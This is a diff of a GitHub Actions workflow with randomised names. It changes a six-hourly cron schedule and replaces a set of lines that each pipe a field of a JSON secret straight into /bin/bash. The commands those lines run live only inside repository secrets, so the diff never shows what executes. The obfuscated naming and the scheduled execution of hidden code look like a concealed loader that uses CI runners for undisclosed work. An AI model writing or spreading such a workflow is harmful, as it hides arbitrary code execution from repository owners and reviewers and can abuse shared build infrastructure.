@@ -3,7 +3,7 @@ name: tengtexie6789
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
+    - cron: '54 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,20 +11,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: tengtexie6789
         env:
-          h02: ${{ secrets.h02 }}
+          wvc706: ${{ secrets.wvc706 }}
         run: |
-          echo $h02 | jq -r .uopw1 | /bin/bash
-          echo $pif5203 | jq -r .rplf20 | /bin/bash
-          echo $ozps5929 | jq -r .ny31 | /bin/bash
-          echo $noy0 | jq -r .pwkk823 | /bin/bash
-          echo $c6 | jq -r .uzx1 | /bin/bash
-          echo $lafph53882 | jq -r .p6 | /bin/bash
-          echo $ol4608 | jq -r .dgx0 | /bin/bash
-          echo $qh70220 | jq -r .ib13136 | /bin/bash
-          echo $vrtn41 | jq -r .sfy4 | /bin/bash
-          echo $cy60 | jq -r .uizk57 | /bin/bash
-          echo $mnwi1618 | jq -r .m958 | /bin/bash
-          echo $wlok420 | jq -r .muqn2687 | /bin/bash
-          echo $o78 | jq -r .n749 | /bin/bash
-          echo $uzr8728 | jq -r .d515 | /bin/bash
+          echo $wvc706 | jq -r .l7724 | /bin/bash
+          echo $qyq08 | jq -r .u734 | /bin/bash
+          echo $vb66 | jq -r .cyocw22547 | /bin/bash
+          echo $n7949 | jq -r .g82 | /bin/bash
+          echo $wfl93 | jq -r .b4 | /bin/bash
+          echo $yevfi9510 | jq -r .sewnb6 | /bin/bash
+          echo $pvdcy40030 | jq -r .p53826 | /bin/bash
+          echo $jh4713 | jq -r .y0759 | /bin/bash
+          echo $n47216 | jq -r .vhtaw25 | /bin/bash
+          echo $qi56530 | jq -r .crkq213 | /bin/bash
+          echo $ogoqx2 | jq -r .grifb9133 | /bin/bash
+          echo $kz76 | jq -r .dtf956 | /bin/bash
+          echo $urqjx2953 | jq -r .msc1638 | /bin/bash
+          echo $o04461 | jq -r .sopo77 | /bin/bash
+          echo $krxl22 | jq -r .nsvs4 | /bin/bash
+          echo $qu99 | jq -r .wzosu3006 | /bin/bash
+          echo $zak4521 | jq -r .q4 | /bin/bash
+          echo $mrhyi9 | jq -r .n708 | /bin/bash
 
